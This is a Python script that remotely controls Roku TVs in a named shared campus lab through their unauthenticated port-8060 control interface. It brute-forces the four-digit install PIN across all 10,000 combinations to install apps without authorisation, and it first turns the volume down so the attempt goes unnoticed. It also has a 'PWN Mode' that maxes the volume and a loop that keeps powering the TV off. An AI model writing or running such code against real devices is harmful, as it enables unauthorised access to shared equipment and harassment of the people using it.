#!/usr/bin/env python3
##############
# Roku Remote Access ('rokuRA')
# This script allows for remote access (so long as connected to 'Commons' Wifi) to the CASlab Roku TVs.

##############
# The IP Address must match the IP found in the Roku TV settings.
# Room 1 IP Address: 192.168.68.101 (Room 1, closest to goodwin entrance)
# Room 2 IP Address: unknown (Room 2, furthest from goodwin entrance)

############### Options:
#
# 1. Install Web Cast
# This will automatically install the 'web cast' application.
#
# 2. Install Another App
# This will allow you to install any app by entering the app number.
#
# 3. Launch Web Cast
# This will launch the 'web cast' application.
#
# 4. Launch Web Cast (PWN Mode: Be warned!)
# This will launch the 'web cast' application and increase the volume to the maximum level.
#
# 5. Launch Another App
# This will allow you to launch any app by entering the app ID.
#
# 6. Loop Shutdown
# This will continuously power off the TV. Press Ctrl+C to exit the script.
#
# 7. Custom Keystroke
# This will allow you to send a custom keypress to the TV. Enter the key ID when prompted.
#
# 8. Exit
# This will exit the script.

############## Known Key IDs (strings):
# Arrow Keys:
# Up: "Up"
# Down: "Down"
# Left: "Left"
# Right: "Right"

# Navigation Controls:
# OK button: "Select"
# Back: "Back"
# Home: "Home"
# Info or asterisk button (*): "Info"

# Playback Controls:
# Play: "Play"
# Pause: "Pause"
# Toggle Play/Pause: "PlayPause"
# Rewind: "Rewind"
# Fast Forward: "FastForward"
# Reverse one frame: "ReverseFrame"
# Forward one frame: "ForwardFrame"
# Instant Replay: "InstantReplay"
# Open Search: "Search"

# Media Control Keys:
# Mute/Unmute: "VolumeMute"
# Channel Up: "ChannelUp"
# Channel Down: "ChannelDown"

# Input Controls:
# TV Input: "InputTuner"
# HDMI 1: "InputHDMI1"
# HDMI 2: "InputHDMI2"
# HDMI 3: "InputHDMI3"
# HDMI 4: "InputHDMI4"
# AV Input: "InputAV"
# Component Input: "InputComponent"

# Special Commands:
# Find Remote: "FindRemote" <- PLAYS NOISE THROUGH COMPATIBLE REMOTES!!!!!!
# Sleep Mode: "Sleep"
# Wake Up: "WakeUp"



# Importing necessary libraries
import requests
import time
import subprocess
from tqdm import tqdm

# Function to check if an app is already installed given the app ID. Returns a Boolean
def check_app_installed(ip, app_id):
    response = requests.get(f"http://{ip}:8060/query/apps")
    return f'<app id="{app_id}"' in response.text

# Function to send keypresses to the Roku TV given the key as a string
def send_keypress(ip, key):
    requests.post(f"http://{ip}:8060/keypress/{key}")

# Function for bruteforcing the 4-digit pin
def try_combinations(ip, app_id):

    for i in range(10000):
        combination = f"{i:04}"
        for digit in combination:
            send_keypress(ip, f"Lit_{digit}")

        send_keypress(ip, "Select")
        if check_app_installed(ip, app_id):
            return True
        
        send_keypress(ip, "Up")
    return False

# Function for installing an app given the app ID
def install_app(ip, app_id):

    # Changing volume down to 0
    for i in tqdm(range(100), desc="Adjusting Volume"):
        send_keypress(ip, "VolumeDown")

    # Attempts to install the app
    requests.post(f"http://{ip}:8060/install/{app_id}")

    if try_combinations(ip, app_id):
        print(f"App {app_id} successfully installed.")

        # Increases volume back up to 15
        for i in tqdm(range(15), desc="Adjusting Volume"):
            send_keypress(ip, "VolumeUp")

    else:
        print(f"Failed to install app {app_id}.")

def select_option(ip):
    while True:

        # Display all options
        option = input("\nSelect an Option: \n1. Install Web Cast\n2. Install Another App\n3. Launch Web Cast\n4. Launch Web Cast (PWN Mode: Be warned!)\n5. Launch Another App\n6. Loop Shutdown\n7. Custom Keystroke\n8. Exit\n")
        
        # Option 1, installs the Web Video Caster application
        if option == '1':
            if check_app_installed(ip, "259656"):
                print("Web Video Caster is already installed")
            else:
                # Decreases volume to 0
                for i in tqdm(range(100), desc="Adjusting Volume"):
                    send_keypress(ip, "VolumeDown")

                # Attempts to install the app
                requests.post(f"http://{ip}:8060/install/259656")
                
                if try_combinations(ip, "259656"):
                    print("Web Video Caster successfully installed.")

                    # Increases volume back up to 15
                    for i in tqdm(range(15), desc="Adjusting Volume"):
                        send_keypress(ip, "VolumeUp")
                else:
                    print("Failed to install Web Video Caster.")

        # Option 2, installs any app given the app ID
        elif option == '2':
            app_id = input("Enter the app number: ")
            if check_app_installed(ip, app_id):
                print(f"App {app_id} is already installed")
            else:
                install_app(ip, app_id)

        # Option 3, launches the Web Video Caster application
        elif option == '3':
            requests.post(f"http://{ip}:8060/launch/259656")
            print("App successfully launched! Please download the Web Video Caster application on your phone to interact with the TV.")

        # Option 4, launches the Web Video Caster application and increases the volume to the maximum level
        elif option == '4':
            for i in tqdm(range(100), desc="Adjusting Volume"):
                send_keypress(ip, "VolumeUp")
            requests.post(f"http://{ip}:8060/launch/259656")
 
        # Option 5, launches any app given the app ID
        elif option == '5':
            app_id = input("Enter the app number: ")
            requests.post(f"http://{ip}:8060/launch/{app_id}")
            print("Custom app launched!")

        # Option 6, continuously powers off the TV
        elif option == '6':
            print("Powering off the TV. Press Ctrl+C to exit.")
            while True:
                try:
                    send_keypress(ip, "PowerOff")
                    time.sleep(1)
                except KeyboardInterrupt:
                    break

        
        elif option == '7':
            keystroke = input("Enter the key ID: ")
            send_keypress(ip, keystroke)

        # Option 8, exits the script
        elif option == '8':
            exit()
        else:
            print("Invalid option, please try again.")


# Asks the user to enter the room number and assigns the correct IP address accordingly
#
print("Available Rooms: 1, 2, where 1 is closest to the Goodwin entrance and 2 is furthest.")
room = input("Enter the room number: ")
if room == '1':
    ip = "192.168.68.101"
elif room == '2':
    print("Room 2 not supported yet.")
    ip = ""
else:
    print("Invalid entry.")
    exit()

# Runs the command line menu 
select_option(ip)
